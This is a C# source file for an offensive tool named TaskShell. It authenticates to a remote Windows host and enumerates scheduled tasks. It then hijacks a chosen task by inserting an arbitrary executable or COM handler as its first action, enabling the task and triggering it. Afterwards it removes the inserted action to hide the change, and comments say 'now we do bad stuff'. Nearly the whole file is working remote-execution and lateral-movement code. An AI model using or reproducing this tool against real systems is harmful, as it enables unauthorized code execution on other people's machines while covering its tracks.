using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using CommandLine;
using Microsoft.Win32.TaskScheduler;
using Action = Microsoft.Win32.TaskScheduler.Action;
using Task = Microsoft.Win32.TaskScheduler.Task;
using Microsoft.Win32;


namespace TaskShell
{
    public class Options
    {

        [Option('h', "Host", Required = true, HelpText = "The remote host")]
        public string Host { get; set; }

        [Option('u', "Username", Required = false, HelpText = "The remote host")]
        public string Username { get; set; }

        [Option('p', "Password", Required = false, HelpText = "The password")]
        public string Password { get; set; }

        [Option('d', "Domain", Required = false, HelpText = "The remote domain")]
        public string Domain { get; set; }

        [Option('t', "Task", Required = false, HelpText = "Fetch info of a specific task")]
        public string Task { get; set; }

        [Option('b', "Binary", Required = false, HelpText = "The binary to tamper the scheduled task with")]
        public string Binary { get; set; }

        [Option('a', "arguments", Required = false, HelpText = "Additional command line arguments for the task")]
        public string Arguments { get; set; }

        [Option('r', "Run", Required = false, HelpText = "Run the task after modifying it")]
        public bool  Run { get; set; }

        [Option('s', "Search", Required = false, HelpText = "Search for a specific task")]
        public string Search { get; set; }

        [Option('c', "Clsid", Required = false, HelpText = "The CLSID to use as a COM handler")]
        public string Clsid { get; set; }
    }

    class Program
    {
        static TaskService AuthenticateToRemoteHost(string host = "127.0.0.1", string username = "", string password = "", string domain = "")
        {
            try
            {
                if (username != null && password != null && domain != null)
                {
                    Console.WriteLine("[+] Authenticating using explicit credentials");
                    TaskService ts = new TaskService(@"\\" + host, username, domain, password);
                    return ts;
                    
                }

                else
                {
                    Console.WriteLine("[+] Authenticating using current user's token");
                    TaskService ts = new TaskService(@"\\" + host);
                    return ts;
                }
            }
            catch (System.UnauthorizedAccessException e)
            {
                Console.WriteLine("[-] Something went wrong with the authentication, check your creds: " + e.Message);
                return null;
            }
        }
        static void EnumAllTasks(string search, string host  = "127.0.0.1", string username = "", string password = "", string domain = "")
        {
            TaskService ts = AuthenticateToRemoteHost(host, username, password, domain);
            if (ts != null)
                EnumFolderTasks(search, ts.RootFolder);
                    
        }

        static void GetTaskInfo(string taskName, string host = "127.0.0.1", string username = "", string password = "", string domain = "")
        {
            TaskService ts = AuthenticateToRemoteHost(host, username, password, domain);
            if (ts != null)
            {
                Task t = ts.GetTask(taskName);
                if (t == null)
                {
                    Console.WriteLine("[+] Task not found!");
                    return;
                }

                ActOnTask(t);
            }
        }

        static void EnumFolderTasks(string search, TaskFolder fld)
        {
            foreach (Microsoft.Win32.TaskScheduler.Task task in fld.Tasks)
                ActOnTask(task, search);
            foreach (TaskFolder sfld in fld.SubFolders)
                EnumFolderTasks(search, sfld);
        }

        static void ActOnTask(Task t, string search = "")
        {
            // Do something interesting here

            if (search != "")
            {

            }
            if (t.Path.Contains(search) || t.Definition.Principal.ToString().Contains(search))
            {

                Console.WriteLine("\r\n============================");
                Console.WriteLine("[+] Path: " + t.Path);
                Console.WriteLine("[+] Principal: " + t.Definition.Principal);

                foreach (Action action in t.Definition.Actions)
                {

                    Console.WriteLine("[+] Action: " + action.ToString());

                    if (t.Definition.Triggers.Count > 0)
                    {
                        foreach (Trigger trigger in t.Definition.Triggers)
                        {
                            Console.WriteLine(trigger.ToString());

                        }
                    }
                }
            }
        }

        static void Main(string[] args)
        {
            var Options = new Options();
            Parser.Default.ParseArguments<Options>(args).WithParsed<Options>(o =>
            {
                
                if (o.Host != null)
                {
                    
                    if (o.Task != null && o.Binary == null && o.Clsid == null)
                    {
                        // we want to narrow down a specific task
                        GetTaskInfo(o.Task, o.Host, o.Username, o.Password, o.Domain);
                    }
                    else if (o.Task != null && o.Binary != null)
                    {
                        // now we do bad stuff
                        TamperTask(o.Task, o.Binary, o.Arguments, o.Run, o.Host, o.Username, o.Password, o.Domain);
                    }

                    else if (o.Task != null && o.Clsid != null)
                    {
                        // now we do bad stuff
                        Console.WriteLine("LOLL");
                        TamperTask(o.Task, o.Clsid, "", o.Run, o.Host, o.Username, o.Password, o.Domain);
                    }
                    else
                    {
                        // by default we enumerate all the tasks in the remote host
                        if (o.Search != null)
                            EnumAllTasks(o.Search, o.Host, o.Username, o.Password, o.Domain);
                        else
                            EnumAllTasks("", o.Host, o.Username, o.Password, o.Domain);

                    }
                } 
                else
                {
                    Console.WriteLine("[-] missing host parameter");
                    return;
                }
                
            });

        }

        private static void TamperTask(string task, string binary, string arguments, bool run, string host, string username, string password, string domain)
        {
            TaskService ts = AuthenticateToRemoteHost(host, username, password, domain);
            if (ts != null)
            {
                Task t = ts.GetTask(task);
                if (t == null)
                {
                    Console.WriteLine("[+] Task not found!");
                    return;
                }

                
                if (binary.Split('-').Length == 5) // weak parsing, I know but YOLO
                {
                    // we suppose we want to execute a COM object and not a binary
                    ComHandlerAction action = new ComHandlerAction(new Guid(binary), string.Empty);
                    // add to the top of the list, otherwise it will not execute
                    Console.WriteLine("[+] Adding custom action to task.. ");
                    t.Definition.Actions.Insert(0, action);

                    // enable the task in case it's disabled
                    Console.WriteLine("[+] Enabling the task");
                    t.Definition.Settings.Enabled = true;
                    t.RegisterChanges();

                    GetTaskInfo(task, host, username, password, domain);
                    Console.WriteLine("\r\n");
                    // run it
                    if (run)
                    {
                        Console.WriteLine("[+] Triggering execution");
                        t.Run();
                    }


                    Console.WriteLine("[+] Cleaning up");
                    // remove the new action
                    t.Definition.Actions.Remove(action);
                    t.RegisterChanges();

                } else
                {
                    ExecAction action = new ExecAction(binary, arguments, null);

                    // add to the top of the list, otherwise it will not execute
                    Console.WriteLine("[+] Adding custom action to task.. ");
                    t.Definition.Actions.Insert(0, action);

                    // enable the task in case it's disabled
                    Console.WriteLine("[+] Enabling the task");
                    t.Definition.Settings.Enabled = true;
                    t.RegisterChanges();

                    GetTaskInfo(task, host, username, password, domain);
                    Console.WriteLine("\r\n");
                    // run it
                    if (run)
                    {
                        Console.WriteLine("[+] Triggering execution");
                        t.Run();
                    }


                    Console.WriteLine("[+] Cleaning up");
                    // remove the new action
                    t.Definition.Actions.Remove(action);
                    t.RegisterChanges();
                }

                
            }
        }
    }
}
